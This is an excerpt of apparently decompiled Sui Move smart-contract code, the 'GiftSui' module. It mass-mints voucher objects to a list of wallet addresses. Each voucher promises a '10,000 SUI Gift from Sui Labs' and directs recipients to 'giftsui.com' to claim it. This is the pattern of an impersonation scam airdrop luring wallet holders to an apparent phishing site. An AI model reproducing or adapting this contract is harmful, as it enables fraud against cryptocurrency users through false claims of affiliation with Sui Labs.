module 0x3f29377bca41c8bbcd50288e719ceafef023a19597577b221c1356d9a4577025::GiftSui {
    ...
    public entry fun GiftFromSui(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = GIFTSUI_VOUCHER{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"10000 SUI Gift"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftsuicom_0726/giftsuicom_0726_0.jpg"),
                description : 0x1::string::utf8(b"This is a voucher for 10,000 SUI Gift from Sui Labs. Claim at https://giftsui.com"),
    ...
    fun init(arg0: GIFTSUI, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftsuicom_0726/giftsuicom_0726_0.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"This is a voucher for 10,000 SUI Gift from Sui Labs. Claim at https://giftsui.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://giftsui.com"));
